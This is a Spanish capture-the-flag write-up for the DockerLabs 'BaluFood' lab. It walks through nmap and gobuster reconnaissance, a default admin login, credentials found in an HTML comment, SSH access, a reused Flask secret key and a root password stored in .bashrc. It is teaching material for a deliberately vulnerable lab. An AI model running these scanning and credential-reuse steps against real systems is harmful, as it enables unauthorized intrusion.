---
title: "DockerLabs - BaluFood"
difficulty: "Fácil"
source: "DockerLabs"
---

Página web de un restaurante con data leakage y escalada de privilegios en Linux con user pivoting.

## Despliegue

```bash
bash auto_deploy.sh balufood.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH)
- **5000/tcp** — HTTP (Flask/Werkzeug) — página web de restaurante

## Enumeración Web

```bash
gobuster dir -u http://172.17.0.2:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Directorios encontrados: `/login`, `/admin` (también expuestos como botón en la página principal).

## Data Leakage — Credenciales admin

Acceso al panel de login en `/login`. Credenciales por defecto:

```
admin:admin
```

Acceso al panel de gestión de pedidos en `/admin`.

En el **código fuente HTML** del panel admin se encuentra un comentario con credenciales de backup:

```html
<!-- sysadmin:backup123 -->
```

## Intrusión — sysadmin

```bash
ssh sysadmin@172.17.0.2
# contraseña: backup123
```

## Data Leakage — Secret Key Flask

En el home de sysadmin se encuentra `app.py` con la secret key hardcodeada:

```python
app.secret_key = 'cuidaditocuidadin'
```

## User Pivoting — sysadmin → balulero

La secret key `cuidaditocuidadin` es la contraseña del usuario `balulero`:

```bash
su balulero
# contraseña: cuidaditocuidadin
```

## Escalada de privilegios — balulero → root

En `/home/balulero/.bashrc` se encuentra la contraseña de root hardcodeada:

```bash
cat /home/balulero/.bashrc
# contraseña de root: chocolate2
```

```bash
su root
# contraseña: chocolate2
whoami
# root
```

## Conclusión

Cadena de ataque: credenciales por defecto en web → comentario HTML con SSH credentials → SSH como sysadmin → secret key en app.py como contraseña de balulero → contraseña de root en .bashrc → root.

**Lecciones aprendidas:**
- Nunca dejar comentarios con credenciales en el HTML — son visibles para cualquiera.
- Las secret keys de Flask no deben estar hardcodeadas en el código fuente.
- Los ficheros `.bashrc` no son un lugar seguro para guardar contraseñas.
- El user pivoting encadenado es un patrón común en CTFs: cada usuario tiene una pista para el siguiente.
